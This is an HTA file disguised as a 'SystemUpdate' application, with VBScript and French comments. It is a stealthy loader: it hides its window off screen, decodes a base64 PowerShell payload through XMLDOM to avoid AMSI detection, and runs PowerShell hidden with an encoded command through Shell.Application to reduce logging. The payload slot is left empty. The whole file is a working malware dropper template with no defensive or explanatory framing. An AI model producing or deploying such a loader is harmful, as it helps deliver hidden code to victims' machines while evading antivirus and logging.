<html>
<head>
<HTA:APPLICATION
    APPLICATIONNAME="SystemUpdate"
    SHOWINTASKBAR="no"
    WINDOWSTATE="minimize"
    CAPTION="no"
    BORDER="none"
    SCROLL="no"
    SINGLEINSTANCE="yes"
    NAVIGABLE="no"
/>
<script language="VBScript">
Sub window_onload
    ' Réduit la fenêtre hors écran
    window.resizeTo 0, 0
    window.moveTo -4096, -4096

    ' Decode payload PS via COM XML (évite les APIs Base64 directes qui triggent AMSI)
    Dim oXML  : Set oXML  = CreateObject("Microsoft.XMLDOM")
    Dim oNode : Set oNode = oXML.createElement("b64")
    oNode.dataType = "bin.base64"
    oNode.text     = ""
    Dim rawBytes : rawBytes = oNode.nodeTypedValue

    ' Re-encode les bytes en base64 string propre (sans espaces/newlines)
    Dim oNode2 : Set oNode2 = oXML.createElement("enc")
    oNode2.dataType        = "bin.base64"
    oNode2.nodeTypedValue  = rawBytes
    Dim psEnc : psEnc = oNode2.text
    psEnc = Join(Split(psEnc, vbCrLf), "")
    psEnc = Join(Split(psEnc, vbLf), "")
    psEnc = Join(Split(psEnc, vbCr), "")

    ' Résoudre le chemin PS via variable d'environnement (évite le literal path)
    Dim wsh  : Set wsh  = CreateObject("WScript.Shell")
    Dim sysR : sysR     = wsh.ExpandEnvironmentStrings("%SystemRoot%")
    Dim psP  : psP      = sysR & "\System32\WindowsPowerShell\v1.0\powershell.exe"

    ' Lancer PS caché avec EncodedCommand
    ' ShellExecute via Shell.Application (moins loggé que WScript.Shell.Run)
    Dim oApp : Set oApp = CreateObject("Shell.Application")
    oApp.ShellExecute psP, "-W 1 -NonI -NoP -En " & psEnc, "", "open", 0

    Set oApp  = Nothing
    Set wsh   = Nothing
    Set oNode = Nothing
    Set oNode2 = Nothing
    Set oXML  = Nothing

    window.close
End Sub
</script>
</head>
<body></body>
</html>
